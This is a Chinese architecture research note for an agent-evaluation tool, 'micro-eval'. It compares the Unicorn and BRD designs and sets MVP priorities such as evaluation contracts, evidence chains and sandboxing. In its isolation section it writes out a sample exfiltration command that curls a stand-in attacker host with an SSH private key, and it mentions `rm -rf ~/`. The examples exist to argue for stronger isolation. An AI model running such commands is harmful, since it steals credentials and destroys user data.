---
title: "micro-eval 架构研究综合分析：Unicorn vs BRD 深度对比"
date: 2026-06-01
status: research-complete
type: research
version: "3"
based-on-commit: 449914b
method: "7-agent parallel workflow + 增量更新 + 产品决策闭环重排"
tags:
  - research
  - architecture
  - competitive-analysis
---

# micro-eval 架构研究综合分析：Unicorn vs BRD 深度对比

**日期**: 2026-06-01
**版本**: v3（§3/§4 按产品决策闭环重排）
**状态**: Research Complete
**方法**: 7-agent parallel workflow + 增量更新 + 产品决策闭环重排
**关联文档**: `2026-06-02-unicorn-design.md`, `micro-eval-brd.md`
**v3 变更**: §3/§4 从“统计/多轮协议优先”重排为“产品决策闭环优先”：Task Authoring、Evaluation Contract、Evidence Chain、Decision Report、Same-start、Cost/Time Guardrails 成为 P0；高级统计与 Multi-turn AgentDriver 降级为 Deferred Research

---

## 1. 核心论点：为什么 Unicorn 优于 BRD

### 论点一：数据模型维度根本不同

BRD 的数据模型是 `(task, baseline_result, candidate_result)` 三元组——一维的二元对比。Unicorn 是 `Agent × Skill × Environment × Params × Repetitions` 的 N 维矩阵。

**失败场景**：团队同时测试 Claude + skill-v2 + docker、Claude + skill-v1 + worktree、GPT-4 + skill-v2 + docker 三个组合。BRD 下需要手动跑 3 次两两对比，每次只能看一对结果，无法做交叉分析（"skill-v2 在所有模型上都更好吗？"）。更致命的是，当 agent 数增长到 5+，C(5,2)=10 次对比的结果无法产生全局排序——统计学上需要 Bradley-Terry 模型，但 BRD 的 RunResult 结构不支持。

**研究支撑**：Chatbot Arena 证明 Bradley-Terry + Bootstrap CI 是多 agent 排名的黄金标准，需要矩阵式数据结构。AI21 Labs 在 200,000 次 SWE-bench 运行中证明每配置需要 4-16 次重复才能得出可靠结论。

---

### 论点二：评分系统从根本上不可用

BRD 的 exact match 对 agent 输出命中率趋近于零。同一个 bug 有 10 种正确修法，变量名/空格/import 顺序不同但功能等价——exact match 全部判错。

**失败场景**：Task 是"修复登录重定向 bug"。Agent A 改了一行 redirect，Agent B 重构了整个 auth 模块同时修复了 bug。两者都正确，但 BRD 的 `expected_output` 只能写死一种答案。

**v2 更新**：Unicorn 现在定义了完整的五模式评分光谱（Mode 1-5），从确定性断言到人工判断全覆盖。BRD 只能覆盖 Mode 1 的一个子集（exact match），对 Mode 2-5 完全无能为力。更关键的是，Unicorn 集成了 Agentic Rubric 工程原则——评分器本身是可编程的验证器（Verifier），能执行代码、运行测试、检查环境状态，而不只是让 LLM 读文本打分。

**研究支撑**：Scale AI 的 Agentic Rubrics（2026）证明评分器本身需要是 agentic 的。Braintrust 的分层评分策略（deterministic checks → heuristic scorers → LLM judge）是当前最佳实践。QQJ 论文证明校准式 rubric 在主观任务上显著优于固定等级描述。

---

### 论点三：隔离模型是安全负债

BRD 只有 git worktree（Level 0 逻辑隔离）。worktree 不隔离网络、进程、环境变量、系统状态。评测第三方 agent 时，agent 可以 `rm -rf ~/`、读取 SSH key、通过 DNS 隧道泄露数据。

**失败场景**：评测一个开源社区提交的 agent。该 agent 执行 `curl attacker.com --data @~/.ssh/id_rsa`，宿主机直接被攻破。即使不是恶意的，一个 bug 导致的死循环也能在 timeout 内调用 1000 次 GPT-4 产生 $50 费用——BRD 没有 cost cap 或 circuit breaker。

**研究支撑**：AWS Bedrock 的 DNS 逃逸漏洞（CVSS 7.5）证明即使 microVM 级隔离也可能被绕过。ARMO 的渐进式强制执行模型证明"隔离 + 行为约束"双层防御是必要的。Codex 的四层防御栈（进程加固 → 沙箱隔离 → 审批流 → 执行策略）是工业级标准。

---

### 论点四：无可观测性 = 无法回答"为什么"

BRD 完全不采集执行轨迹。评测的核心价值不只是"谁赢了"，而是"为什么赢"。没有 trace，无法回答"Agent A 为什么在这个 task 上失败了"——是工具调用错误？token 耗尽？推理走偏？

**失败场景**：Agent A 和 Agent B 在 10 个 task 上 pass rate 相同（都是 80%）。BRD 结论："两者等价"。但 Agent A 平均花费 $0.03/task、45 秒，Agent B 平均花费 $0.30/task、5 分钟，且 B 有大量无效工具调用。没有 trajectory evaluation，这些关键差异完全不可见。

**研究支撑**：OSWorld-Human 的 WES 指标证明"快速失败"优于"缓慢失败"，planning/reflection 占总延迟 75-94%。WebGraphEval 发现平均步骤膨胀 2.14 倍，76.7% 的动作是必要的。

---

### 论点五：统计可信度为零

BRD 每个 (task, agent) 只跑一次，结论不可靠。LLM agent 有内在随机性（temperature > 0、工具调用顺序不确定、外部 API 返回不同结果）。单次结果可能完全误导决策。

**失败场景**：Task "修复 auth bug"，Agent A 跑一次成功，Agent B 跑一次失败。BRD 结论："A 更好"。但各跑 5 次后，A 的 pass rate 是 3/5=60%，B 是 4/5=80%。Anthropic 自己的研究证明：低于 3 个百分点的差异应持怀疑态度，基础设施噪声可导致 15% 准确率变化。

**研究支撑**：AI21 Labs 在 200,000 次 SWE-bench 运行中证明 duplicity 4-16 是最低要求。Stanford CRFM 证明 200 个精选题目即可达到全量评测精度（基于 IRT Fisher 信息量）。

---

## 2. 按 BRD 实施的预期问题时间线

### Phase 1 (0-3 months)

| 周次 | 问题 | 严重度 | 触发条件 |
|------|------|--------|----------|
| Week 1 | exact match 对代码输出全部判错 | **阻塞** | 第一次评测真实 coding agent |
| Week 2 | 并行执行时共享状态污染 | 高 | 两个 agent 访问同一 API/数据库 |
| Week 2 | DeepEval 嵌套 event loop RuntimeError | 中 | asyncio 执行层 + DeepEval evaluate() |
| Week 3 | Agent 需要 API key 但 worktree 不传递 secrets | **阻塞** | 评测调用 LLM API 的 agent |
| Week 4 | 用户要对比 3+ 个 agent，CLI 只支持 binary | 高 | 团队有多个候选方案 |
| Month 2 | JSON 文件 I/O 瓶颈（250+ 文件遍历） | 中 | 50 task × 5 config |
| Month 2 | "昨天跑过了今天 fail"的幽灵失败 | 高 | 外部 API 返回不同结果 |
| Month 3 | 恶意/有 bug 的 agent 逃逸 worktree | **致命** | 评测第三方 agent |
| Month 3 | 无法回答"为什么这个 agent 失败了" | 高 | 用户需要 debug 失败 case |

**Phase 1 核心风险**：评分系统不可用（Week 1）和隔离不足（Month 3）是两个最可能导致项目停滞的问题。

---

### Phase 2 (3-6 months)

| 时间 | 问题 | 严重度 | 触发条件 |
|------|------|--------|----------|
| Month 4 | LLM-as-judge 成本爆炸（$5-15/run） | 高 | 250 次 judge 调用/run |
| Month 4 | Langfuse trace ID 与 DeepEval 不互通 | 中 | 接入 Langfuse 时 |
| Month 4 | DeepEval breaking change（频繁发版） | 中 | 依赖升级时 |
| Month 5 | 无法做纵向趋势对比（run 之间无关联） | 高 | 用户想看"这周改进了吗" |
| Month 5 | Skill 版本化缺失 | 高 | 用户迭代 prompt |
| Month 6 | 评分结果被 agent 操纵 | 中 | agent 学会"讨好"评分器 |
| Month 6 | 换 trace provider 需要改几十个文件 | 高 | Langfuse 定价变化 |

**Phase 2 核心风险**：集成问题集中爆发。适配层如果在 Phase 1 没有预留，此时补救成本 3-4x。

---

### Phase 3 (6-12 months)

| 时间 | 问题 | 严重度 | 触发条件 |
|------|------|--------|----------|
| Month 7 | 数据模型无法表达多维度对比 | **架构级** | 用户问"A 代码质量赢但 B 更便宜" |
| Month 8 | 需要统计显著性但架构不支持 repetitions | **架构级** | 向他人证明结果可信 |
| Month 9 | OpenHands 接入需要完全不同的执行模型 | **架构级** | Phase 3 目标 |
| Month 10 | 从 JSON 迁移到 DB 的 migration 噩梦 | 高 | 性能不可接受 |
| Month 11 | 需要重写执行层以支持 container 隔离 | **架构级** | 安全事故后 |
| Month 12 | 实质上需要重写整个系统 | **致命** | 累积技术债 |

**Phase 3 核心风险**：BRD 架构的多个根本假设（binary 对比、单次执行、无隔离、flat JSON）同时到达极限，修补成本超过重写成本。

---

## 3. Unicorn 设计的产品决策闭环评估（v3 重排）

本节不再评估 Unicorn 是否具备“完整 eval 平台”的全部能力，而是评估它能否完成 micro-eval 的真实产品目标：

> 在 10–15 分钟内，帮助 1–20 人 AI 小团队判断一次 agent / skill / prompt 改动是**变好了、变差了，还是样本不足无法判断**，并且结论可溯源、可复现、可行动。

这个重排改变了优先级：高级统计、多轮 AgentDriver、完整 TraceProvider、record/replay 都不是 P0。P0 是让用户把真实改动转成可评测任务，跑出同起点矩阵，得到带证据链的决策报告。

### 3.1 北极星问题

micro-eval 的北极星问题不是“能算多少指标”，而是：

```
在同一起点、同一任务集、同一评判边界下，
这次改动是否值得采用？

答案只能是三类：
1. 变好了：可以 promote / merge / 替换旧版本
2. 变差了：应该 rollback / 保留旧版本
3. 无法判断：样本不足、任务不够判别、结果摇摆、环境不一致
```

这意味着设计的第一优先级不是更复杂的评分算法，而是**决策闭环**是否成立。

### 3.2 用户决策闭环

micro-eval 应该服务下面这条闭环：

```
一次 agent / skill / prompt 改动
        │
        ▼
选择候选 Configuration
Agent × Skill × Environment × Params
        │
        ▼
编写 / 导入 Task
prompt + workspace + expectations + validation + scoring
        │
        ▼
声明 Evaluation Contract
比较对象、成功标准、预算、同起点、结论阈值
        │
        ▼
Same-start 矩阵执行
Tasks × Configurations × Repetitions
        │
        ▼
Evidence 生成
artifacts + diff + validation + grading + annotation + trace_ref
        │
        ▼
Decision Report
变好 / 变差 / 无法判断 + 证据 + 成本 + 反例
        │
        ▼
用户决策
promote / rollback / rerun / expand tasks
```

只要这条闭环断掉，产品就会退回“展示一堆结果，让用户自己猜”。那不是决策工具。

### 3.3 P0 原语表

| P0 原语 | 用户痛点 | MVP 交付物 | 必须记录的数据 | UI / 报告呈现 |
|---------|---------|-----------|---------------|--------------|
| **Task Authoring** | 用户不知道如何把真实改动写成可评测任务 | task 模板、expectations 写法、validation command 示例、rubric presets | task_id、workspace、expectations、validation、scoring、schema_version | “这个 task 在验证什么”、坏 task 警告、示例任务 |
| **Evaluation Contract** | 没有明确评判边界，结论不可审计 | 每次 run 的评测合同 | comparison_subject、task_set_version、success_criteria、budget、decision_threshold、inconclusive_policy | 报告顶部显示本次评测到底在回答什么 |
| **Black-box Command Adapter** | 真实 agent 是完整程序，不是 SDK 函数 | 安全 command 执行、stdin/file/arg 输入、stdout/file/directory/diff 输出 | command argv、cwd、env allowlist、input_mode、output_mode、exit_code、timeout、trace_id | 每个 cell 可查看命令、退出状态、stdout/stderr、产物 |
| **Evidence Chain** | 用户不信任分数，必须看到证据 | 轻量 `ValidationResult` / `GradingResult` / `Evidence` 契约 | verifier_id、evidence type、summary、artifact_ref、raw_ref、severity、redacted | 分数可点开：测试输出、diff 证据、失败日志、人工理由 |
| **Decision Report** | 矩阵不是终点，决策才是终点 | verdict taxonomy + 证据摘要 + 反例任务 + 建议动作 | verdict、confidence_label、winner/loser、mixed cases、cost/time、snapshot status | “变好 / 变差 / 无法判断”，并说明为什么 |
| **Same-start Reproducibility** | 起点不一致会摧毁可信度 | SameStartSnapshot schema | repo commit、workspace hash、task/config/rubric/skill/verifier hash、sandbox、tool/env allowlist、context budget | run 可比 / 不可比标记，snapshot mismatch 警告 |
| **Cost/Time Guardrails** | 矩阵 + repetitions 可能又贵又慢 | run 前估算、run 中硬 cap、run 后 cost per decision | max_concurrent、timeout、estimated cost、actual cost、judge budget、cancel reason | 运行前提示成本，运行中可取消，报告解释慢/贵样本 |
| **Basic Honest Stats** | 单次结果会误导，但高级统计会伪精确 | N、pass rate、均值/中位数、离散度、低样本警告 | repetitions、pass_count、score distribution、cost/time distribution、consistency | 明确标记“样本太少 / 结果摇摆 / 无法判断” |

### 3.4 当前设计中应保留的正确方向

Unicorn 相对 BRD 的核心优势仍然成立：

1. **ResultMatrix 是正确核心**：`Run = Tasks × Configurations × Repetitions → ResultMatrix` 仍是产品护城河。用户真实问题是“哪个 agent / skill / prompt 组合值得采用”，不是二元 baseline/candidate 对比。
2. **Task 模型方向正确**：`prompt + workspace + expectations + validation + scoring` 比 `input_payload + expected_output` 更接近真实 agent 任务。
3. **三层评分链正确**：validation → grading → annotation 保留了“确定性验证优先、LLM 判断次之、人工兜底”的产品信任路径。
4. **黑盒 agent 假设正确**：MVP 应评测完整 agent 程序的产出，不应绑定 LangChain、DeepEval runner 或某个 agent 内部协议。
5. **Same-start 是信任底座**：repo commit、workspace 状态、task/config/skill 版本、工具白名单、sandbox、上下文预算必须可追溯。
6. **Trace/Cost/Latency 方向正确**：它们的定位是解释“为什么”和“值不值”，不是建设通用 observability 平台。
7. **Skill 是一等公民**：Configuration 仍应表达 Agent × Skill(optional) × Environment × Params × Repetitions。

### 3.5 当前最大缺口重排

原 v2 研究把“统计分析模块不足”和“多轮交互 Agent 驱动协议”放得过高。按产品目标重排后，真正危险的缺口是：

| 排名 | 缺口 | 为什么危险 | 正确优先级 |
|------|------|------------|------------|
| 1 | **Task Authoring 不够产品化** | 用户写不出好 task，后续矩阵和评分都会变成对坏问题的精密计算 | P0 |
| 2 | **Evaluation Contract 未定义** | 没有比较对象、成功标准、预算、结论阈值，报告不可审计 | P0 |
| 3 | **Evidence schema / Evidence UI 未定义** | 分数不可点开验证，用户无法信任结论 | P0 |
| 4 | **Decision Report 未成为一等交付物** | 产品退化成 dashboard，用户仍需自己判断 | P0 |
| 5 | **Same-start snapshot 不够完整** | run 之间不可比，复现承诺落空 | P0 |
| 6 | **Cost/Time Guardrails 不够具体** | 第一次矩阵 run 可能太贵太慢，用户放弃 repetitions | P0 |
| 7 | **Black-box command adapter 合同不够硬** | “能跑”但不可比、不可审计，还可能有 shell 注入风险 | P0 |
| 8 | 基础统计展示缺口 | 需要防止单次偶然结果误导，但不需要显著性剧场 | P0/P1 |
| 9 | TraceProvider 深度归一化 | 有助于解释失败，但不应阻塞最小决策闭环 | P1/P2 |
| 10 | 多轮 AgentDriver | 未来兼容 Devin/OpenHands/EventStream，但不是 MVP 生死线 | P2/P3 |
| 11 | 高级统计 / IRT / Bradley-Terry | 大规模 benchmark 或主观 ranking 才需要；早期会制造伪精确 | P2/P3 |

### 3.6 明确反目标

为了防止 micro-eval 被拉向错误方向，近期应明确不做：

- 不做学术 benchmark 平台。
- 不做高级统计 / 排名平台。
- 不做完整多轮 AgentDriver 或接管 agent 内部推理循环。
- 不做通用 observability 平台。
- 不追求 full deterministic replay。
- 不在 MVP 接管复杂 remote sandbox / VM 编排。
- 不让 LLM judge 或 pairwise ranking 成为产品可信度的第一来源。

**核心判断**：当前最大缺口不是多轮 Agent 协议，也不是 Bradley-Terry 或 IRT，而是用户还没有一条明确路径把真实改动转成 Evaluation Contract，并获得带证据链的 same-start Decision Report。

---

## 4. 需要深入研究 / 设计的主题清单（v3 重排）

§4 的优先级按“能否形成可信决策”排序，而不是按技术先进性排序。P0 是闭环必需品，P1 是可信度增强，P2/P3 是平台化能力。

### 4.1 Task Authoring（优先级：P0）

**当前盲区**：研究和设计文档已经定义了 Task 的理想结构，但还没有回答用户最先遇到的问题：如何在 10 分钟内把一个真实 agent / skill / prompt 改动写成可评测 task？

坏 task 会把后续矩阵、评分和报告都变成对错误问题的精密计算，因此 Task Authoring 是 P0 首位。

**需要设计**：
- 任务模板：coding bugfix、code review skill、UI/design skill、doc writing、architecture review。
- `expectations` 写法：可验证断言、人工判断项、LLM judge 项如何区分。
- `validation.commands` 写法：何时跑 test/build/lint/schema/custom script。
- artifact expectations：期望 diff、文件、目录、报告、评论、JSON 输出。
- rubric presets：coding/document/ui_design/skill_review 的默认维度。
- 坏 task 检测：过于模糊、无可验证产物、没有 workspace、没有成功标准、scope 太大。

**MVP 交付物**：
- `micro-eval init` 生成 3–5 个真实 task 模板。
- Task schema 错误信息能指导用户修正。
- 文档中给出“好 task / 坏 task”对照。
- UI 或 CLI 能解释每个 task 在验证什么。

**明确不做**：
- MVP 不做自动生成大规模 task library。
- MVP 不维护公共 benchmark suite。
- LLM 辅助生成 task 可以后置，不能替代用户确认。

---

### 4.2 Evaluation Contract（优先级：P0）

**当前盲区**：Run 现在能表达矩阵，但缺少“本次评测到底在回答什么”的合同。没有 Evaluation Contract，Decision Report 只是漂亮的结果页。

**建议字段**：

```yaml
evaluation_contract:
  question: "code-review skill v2 是否值得替换 v1？"
  comparison_subject: skill_version
  task_set_version: sha256:...
  configuration_set: sha256:...
  same_start_required: true
  success_criteria:
    primary: "v2 在 critical tasks 上无 regression"
    secondary: "平均成本不超过 v1 的 1.5x"
  grading_policy:
    deterministic_first: true
    llm_judge_allowed: true
    human_annotation_required_for: [mixed, inconclusive]
  budget:
    max_cost_usd: 20
    max_duration_min: 15
    max_repetitions: 3
  decision_threshold:
    promote_if: "pass_rate_delta >= 0.15 and no_critical_regression"
    rollback_if: "critical_regression_count > 0"
    inconclusive_if: "n < 3 or result_consistency < 0.67"
  schema_version: 1
```

**MVP 交付物**：
- Run manifest 中持久化 Evaluation Contract。
- Report 顶部展示本次评测问题、成功标准、预算、结论阈值。
- 如果实际执行偏离 contract（预算超限、snapshot mismatch、repetition 不足），报告必须标记 caveat。

**明确不做**：
- 不做复杂 policy engine。
- 不做自动决策上线。
- Contract 先作为审计与报告边界，不作为企业审批流。

---

### 4.3 Black-box Command Adapter（优先级：P0）

**当前盲区**：MVP 的真实差异化是能评测完整 agent 程序。多轮 AgentDriver 可以后置，但 black-box command adapter 必须扎实。

**接口要求**：
- 输入：`stdin | file | arg`。
- 输出：`stdout | file | directory | diff`。
- 执行：必须使用 argv/list 或安全模板解析，禁止 shell 字符串插值。
- 工作目录：每个 cell 在独立 workspace 中执行。
- 环境：显式 env allowlist，secrets 不写入 artifacts。
- 退出：记录 exit code、signal、timeout、cancel reason。
- 产物：收集 stdout/stderr、output files、directory artifacts、git diff。
- 观测：注入 `MICRO_EVAL_TRACE_ID`，支持 self-report trace file。
- 安全：stdout/stderr/artifacts 持久化前做 secret redaction。

**MVP 交付物**：
- 一个稳定的 `AgentSpec` / adapter contract。
- Claude Code 非交互模式、Codex CLI、自定义脚本都能用同一协议跑。
- 每个 RunResult 可回放“执行了什么命令、在什么目录、输入是什么、输出在哪里”。

**明确不做**：
- MVP 不接管 agent 内部多轮对话。
- MVP 不实现 OpenHands/Devin EventStream driver。
- MVP 不要求所有 agent 暴露结构化 tool call trace。

---

### 4.4 Evidence Chain / ValidationResult（优先级：P0）

**当前盲区**：评分结果如果不能点开看到证据，用户不会信。这里需要的是轻量结果契约，不是独立 VerifierEngine。

**设计原则**：
- 确定性验证优先，LLM judge 不能覆盖 critical validation failure。
- Evidence 是产品输出，不是内部日志。
- Evidence 必须结构化、截断、归因到 task/config/repetition/verifier。
- 原始日志可以保存为 artifact，但报告中只展示摘要和关键片段。

**建议数据契约**：

```yaml
evidence:
  id: ev-test-001
  type: test_output | diff | lint | build | schema | llm_judge | human_note | trace_ref
  source: "npm test"
  status: passed | failed | error | skipped
  severity: info | warning | critical
  summary: "12 tests passed, 1 failed in auth_redirect.test.ts"
  artifact_ref: ".micro-eval/artifacts/.../test-output.txt"
  excerpt: "Expected /home, received /dashboard"
  redacted: true
  task_id: fix-auth-redirect
  configuration_id: claude-skill-v2
  repetition: 1
```

**MVP 交付物**：
- `ValidationResult` 包含 status、commands_run、evidence refs。
- `GradingResult` 包含 expectations、rubric scores、evidence refs。
- `Annotation` 包含人工评分、理由、annotator、timestamp。
- UI 中每个分数都能展开证据。

**明确不做**：
- 不引入完整 Verifier Protocol / VerifierEngine 作为独立框架。
- 不把几千行 stdout 直接塞进报告。
- 不让 LLM judge 自评 agent 输出。

---

### 4.5 Decision Report（优先级：P0）

**当前盲区**：矩阵对比页不是终点。产品必须产出一份能让用户行动的 Decision Report。

**报告应回答**：
1. 这次改动是变好了、变差了，还是无法判断？
2. 哪些 task 支持这个结论？哪些 task 反向？
3. 成本和耗时是否值得？
4. 有没有 critical regression？
5. 结果是否同起点可比？
6. 样本数是否足够？有没有结果摇摆？
7. 下一步建议是什么：merge、rollback、rerun、补 task、人工复核？

**建议 verdict taxonomy**：

| Verdict | 含义 | 示例动作 |
|---------|------|---------|
| `improved` | 新配置明显更好，且无 critical regression | promote / merge |
| `regressed` | 新配置破坏关键任务或成本不可接受 | rollback / block |
| `mixed` | 部分任务更好，部分任务更差 | 按 task 类型拆分，继续迭代 |
| `inconclusive` | 样本太少、结果摇摆、环境不一致或 judge 不稳定 | rerun / expand task set / human review |

**MVP 交付物**：
- 每次 run 生成 `decision_report.json` 和 HTML/Markdown 展示。
- 报告包含矩阵摘要、证据链接、成本/时间、same-start snapshot、caveats。
- 报告敢于说 `inconclusive`，避免伪确定性。

**明确不做**：
- 不做自动上线决策。
- 不把 pairwise Elo 当作 MVP 报告核心。
- 不把报告做成 generic dashboard export。

---

### 4.6 Same-start Reproducibility（优先级：P0）

**当前盲区**：Unicorn 已经强调同起点，但需要收窄成 MVP 可落地的 snapshot contract，而不是直接走 full deterministic replay。

**建议 SameStartSnapshot 字段**：
- repo commit / branch / dirty state。
- workspace source hash。
- task file hash / task schema version。
- configuration hash。
- skill path / version / content hash。
- rubric / validation / grading policy hash。
- agent command argv / agent version if detectable。
- tool allowlist / env allowlist。
- secrets presence（只记录存在性，不记录值）。
- sandbox / isolation config。
- setup command digest。
- timeout / max output / context budget / token budget。
- micro-eval version / dependency lock hash。

**MVP 交付物**：
- Run manifest 持久化 snapshot。
- compare/report 时检测 snapshot mismatch。
- mismatch 时报告必须说“不可直接比较”或降级 confidence。

**明确不做**：
- MVP 不做 full deterministic replay。
- MVP 不录制所有 HTTP/LLM/tool 调用。
- replay/debug 可以作为后续能力。

---

### 4.7 Cost/Time Guardrails（优先级：P0）

**当前盲区**：矩阵展开 + repetitions 是产品核心，但也可能让第一次体验变慢、变贵、失控。guardrails 必须进入执行层，而不是只作为 UI 提醒。

**run 前**：
- 展示矩阵规模：tasks × configurations × repetitions。
- 估算最坏耗时：cell timeout × cell count / max_concurrent。
- 估算 judge 成本上限。
- 提醒高风险配置：repetitions 过多、task 过多、timeout 过长。

**run 中**：
- per-cell timeout。
- global run timeout。
- max_concurrent。
- max output/artifact size。
- max cost / judge budget。
- cancel / fail-fast。
- build/test critical failure 后跳过昂贵 grading。

**run 后**：
- cost per decision。
- slowest cells。
- most expensive cells。
- cost vs quality tradeoff。
- 因预算停止的 caveat。

**MVP 交付物**：
- `guardrails` 配置块。
- CLI run 前确认摘要。
- report 中显示预算、实际成本、停止原因。

---

### 4.8 Basic Honest Stats（优先级：P0/P1）

**当前盲区**：BRD 正确识别了单次执行不可靠，但近期不需要高级统计引擎。基础统计的目标不是制造显著性，而是防止单次偶然结果误导决策。

**MVP 需要**：
- `n`：每个 task/config 实际 repetitions。
- pass_count / fail_count / error_count。
- pass rate。
- mean / median score。
- mean / median latency。
- mean cost。
- score / pass consistency。
- 低样本警告。
- 结果摇摆警告。
- `inconclusive` verdict。

**明确后置**：
- 多重比较校正。
- power analysis。
- IRT Fisher information。
- adaptive sampling。
- Bradley-Terry / Elo ranking。
- 小样本 pairwise 收敛分析。

**关键原则**：

> 统计在 MVP 的作用是诚实地限制结论，不是给小样本结果包装确定性。

---

### 4.9 LLM Judge Safety 与 TraceRef（优先级：P1）

**当前盲区**：评分器安全和 trace 解释性都重要，但它们应增强 P0 闭环，而不是阻塞 P0。

**LLM Judge Safety 需要**：
- agent output 作为 untrusted content 包裹。
- judge prompt 与 artifact content 严格分离。
- 对 prompt injection 样例做测试。
- judge 输出 schema validation。
- 多 judge / human review 只在高风险或 mixed/inconclusive 时启用。
- deterministic validation failure 不可被 LLM 覆盖。

**TraceRef 需要**：
- 每个 cell 有 `trace_id`。
- 内建记录 stdout/stderr、duration、exit code、commands、artifact refs。
- 支持 self-report trace file。
- 支持 Langfuse/LangSmith 等 provider 作为可选增强。
- report 能链接 trace，但没有 rich trace 时仍可形成决策。

**明确不做**：
- 不先做 OpenTelemetry 大一统。
- 不要求所有 agent 提供完整 tool-call trace。
- 不把 TraceProvider 深度归一化作为 MVP 前置条件。

---

### 4.10 Deferred Research（优先级：P2/P3）

以下主题仍有价值，但不是近期实现顺序的中心。文档中应保留接口方向，避免把它们误认为 P0。

| 主题 | 为什么后置 | 保留什么扩展点 |
|------|------------|----------------|
| Multi-turn AgentDriver | MVP 先评测完整 command 产出，不接管 agent 内部对话 | `input_mode` / `output_mode` / `trace_ref` / future `driver_type` |
| Advanced Statistics | 早期用户需要决策诚实，不需要显著性剧场 | repetitions、raw results、score distributions |
| Pairwise / Bradley-Terry / Elo | 主观多配置排名才需要，小样本易伪精确 | `scoring.mode: pairwise` 作为后续模式 |
| AdaptiveScheduler / SequentialStopper | 成本优化先靠 guardrails、cache、fail-fast | run manifest 保留 actual cost/time |
| Record/Replay | full replay 工程量大，MVP 先锁同起点 | SameStartSnapshot、trace_id、artifact refs |
| Deep Trace Normalization | rich trace 是解释性增强，不是决策闭环前置 | TraceProvider、TraceRef、provider metadata |
| Remote sandbox / VM | trusted 本地 agent 先用 worktree，untrusted 后置 | WorkspaceProvider abstraction |
| 五模式校准方法论 | Mode 3/4 有价值，但先把 Mode 1/2/5 证据链跑通 | scoring layers、annotation ground truth |

---

## 5. 推荐的近期学术论文和工程 Blog

### 评分系统

| 优先级 | 来源 | 主题 | 链接 |
|--------|------|------|------|
| 必读 | Scale AI | Agentic Rubrics as Contextual Verifiers | [arxiv 2601.04171](https://arxiv.org/abs/2601.04171) |
| 必读 | — | Task-Adaptive Rubrics for Agent Evaluation | [arxiv 2603.21362](https://arxiv.org/abs/2603.21362) |
| 必读 | Braintrust | Writing Scorers (分层评分实践) | [braintrust.dev](https://braintrust.dev/docs/best-practices/scorers) |
| 推荐 | — | Bias and Uncertainty in LLM-as-a-Judge | [arxiv 2605.06939](https://arxiv.org/abs/2605.06939) |
| 推荐 | — | Security in LLM-as-a-Judge | [arxiv 2603.29403](https://arxiv.org/html/2603.29403v1) |
| 推荐 | — | Instance-Optimal Multi-Judge on a Budget | [arxiv 2605.23362](https://arxiv.org/abs/2605.23362) |
| 推荐 | — | QQJ: Quantifying Qualitative Judgment | [arxiv 2605.17382](https://arxiv.org/abs/2605.17382) |
| 参考 | — | Unifying Rubric-based LLM Evaluation | [arxiv 2603.00077](https://arxiv.org/abs/2603.00077) |
| 参考 | — | Automated Rubric Synthesis for RL | [arxiv 2605.23454](https://arxiv.org/html/2605.23454v1) |

### 沙箱与隔离

| 优先级 | 来源 | 主题 | 链接 |
|--------|------|------|------|
| 必读 | OpenAI | Codex Sandboxing Architecture | [openai-codex.mintlify.app](https://openai-codex.mintlify.app/architecture/sandboxing) |
| 必读 | ARMO | Progressive Enforcement Guide | [armosec.io](https://www.armosec.io/blog/ai-agent-sandboxing-progressive-enforcement-guide/) |
| 推荐 | E2B | How Manus Uses E2B | [e2b.dev](https://e2b.dev/blog/how-manus-uses-e2b-to-provide-agents-with-virtual-computers) |
| 推荐 | — | AWS Bedrock DNS Escape (教训) | [csoonline.com](https://www.csoonline.com/article/4146202/aws-bedrocks-isolated-sandbox-comes-with-a-dns-escape-hatch.html) |
| 参考 | Cisco | Foundry Security Spec | [blogs.cisco.com](https://blogs.cisco.com/ai/announcing-foundry-security-spec) |
| 参考 | SWE-bench | Docker Setup (三层镜像) | [swebench.com](https://www.swebench.com/SWE-bench/guides/docker_setup/) |

### 可观测性与 Trace

| 优先级 | 来源 | 主题 | 链接 |
|--------|------|------|------|
| 必读 | — | OpenTelemetry GenAI Semantic Conventions | [greptime.com](https://greptime.com/blogs/2026-05-09-opentelemetry-genai-semantic-conventions) |
| 必读 | — | Debug Agents Like Distributed Systems | [tianpan.co](https://tianpan.co/blog/2026-04-13-debug-agents-like-distributed-systems) |
| 推荐 | — | Deterministic Replay for AI Agents | [tianpan.co](https://tianpan.co/blog/2026-04-12-deterministic-replay-debugging-non-deterministic-ai-agents) |
| 推荐 | Anthropic | Infrastructure Noise in Agentic Evals | [anthropic.com](https://www.anthropic.com/engineering/infrastructure-noise) |
| 参考 | — | LLM Observability in Production | [tianpan.co](https://tianpan.co/blog/2025-11-12-llm-observability-tracing-production) |
| 参考 | — | Platform Comparison 2026 | [digitalapplied.com](https://www.digitalapplied.com/blog/agent-observability-platforms-langsmith-langfuse-arize-2026) |

### 统计方法

| 优先级 | 来源 | 主题 | 链接 |
|--------|------|------|------|
| 必读 | AI21 Labs | Lessons from 200,000 SWE-bench Runs | [ai21.com](https://www.ai21.com/blog/scaling-agentic-evaluation-swe-bench/) |
| 必读 | Stanford CRFM | Reliable and Efficient Evaluation (IRT) | [crfm.stanford.edu](https://crfm.stanford.edu/2025/06/04/reliable-and-efficient-evaluation.html) |
| 推荐 | Arena | Extended Arena Score (Bradley-Terry) | [arena.ai](https://arena.ai/blog/extended-arena/) |
| 推荐 | Wu et al. | Factorized Active Querying (5x 效率) | [arxiv 2601.20251](https://arxiv.org/abs/2601.20251) |
| 参考 | — | PSN-IRT (任务质量诊断) | [arxiv 2505.15055](https://arxiv.org/html/2505.15055v3) |
| 参考 | — | Multiple Comparisons in Evals | [statstest.com](https://www.statstest.com/multiple-prompts-metrics-controlling-false-discoveries-evals) |

### 轨迹评测

| 优先级 | 来源 | 主题 | 链接 |
|--------|------|------|------|
| 必读 | — | Benchmarking CUA Efficiency (WES 指标) | [arxiv 2506.16042](https://arxiv.org/html/2506.16042v1) |
| 推荐 | — | AgentRewardBench | [arxiv 2504.08942](https://arxiv.org/abs/2504.08942) |
| 推荐 | — | WebGraphEval (轨迹图分析) | [arxiv 2510.19205](https://arxiv.org/html/2510.19205v1) |
| 推荐 | METR | Measuring AI Ability to Complete Long Tasks | [metr.org](http://metr.org/blog/2025-03-19-measuring-ai-ability-to-complete-long-tasks/) |
| 参考 | — | Towards Trustworthy Evaluation of Autonomous Agents | [arxiv 2604.06132](https://arxiv.org/abs/2604.06132) |

### 评分模式与校准（v2 新增）

| 优先级 | 来源 | 主题 | 链接 |
|--------|------|------|------|
| 必读 | — | QQJ: Quantifying Qualitative Judgment | [arxiv 2605.17382](https://arxiv.org/abs/2605.17382) |
